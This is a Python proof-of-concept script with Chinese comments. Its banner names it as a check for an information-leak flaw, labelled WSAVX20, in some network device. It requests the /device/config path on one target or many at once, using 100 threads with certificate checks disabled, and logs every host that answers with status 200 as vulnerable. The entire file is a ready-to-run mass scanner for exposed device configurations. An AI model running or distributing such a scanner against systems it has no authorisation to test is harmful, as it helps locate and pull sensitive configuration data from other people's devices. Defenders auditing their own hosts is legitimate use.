import requests  # 导入requests库用于发送HTTP请求
import argparse  # 导入argparse库用于解析命令行参数
import sys  # 导入sys库用于处理命令行参数
from multiprocessing.dummy import Pool  # 导入Pool模块用于多线程处理

# 忽略警告
requests.packages.urllib3.disable_warnings()

# 定义一个打印banner的函数
def banner():
    banner = """
_____________   _______________         _______________   ________    _____           ________   ._________________________  .________
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \  /  |  |          \_____  \  |   ____/\______  \_____  \ |   ____/
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/ /   |  |_  ______  /  ____/  |____  \     /    / _(__  < |____  \ 
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \/    ^   / /_____/ /       \  /       \   /    / /       \/       \
 \______  / \___/   /_______  /         \_______ \_____  /\_______ \____   |          \_______ \/______  /  /____/ /______  /______  /
        \/                  \/                  \/     \/         \/    |__|                  \/       \/                 \/       \/   
                                                                                version: 1.0
    """
    print(banner)

# 主函数
def main():
    banner()  # 打印banner
    parser = argparse.ArgumentParser(description='WSAVX20 information leakage! ')  # 创建解析器对象
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')  # 添加命令行参数选项
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')  # 添加命令行参数选项
    args = parser.parse_args()  # 解析命令行参数

    # 判断输入的参数是单个链接还是文件路径
    if args.url and not args.file:
        poc(args.url)  # 调用poc函数处理单个链接
    elif not args.url and args.file:
        url_list = []  # 存储链接的列表
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))  # 读取文件中的链接并添加到列表中
        # 多线程处理链接
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")  # 打印提示信息

# 漏洞检测函数
def poc(target):
    url = target + '/device/config'  # 构造POC的URL
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
        'Connection': 'close',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Accept-Encoding': 'gzip'
    }  # 设置请求头
    res = ""  # 初始化响应对象
    try:
        res = requests.get(url, headers=headers, verify=False, timeout=5)  # 发送HTTP请求
        # 判断是否存在信息泄露
        if res.status_code == 200:
            print(f"[+]该url存在漏洞{target}")  # 打印存在漏洞的提示信息
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")  # 将存在漏洞的链接写入文件
        else:
            print(f"[-]该url不存在漏洞{target}")  # 打印不存在漏洞的提示信息
    except Exception as e:
        print(f"[*]该url存在问题{target}", e)  # 打印异常信息

if __name__ == '__main__':
    main()  # 调用主函数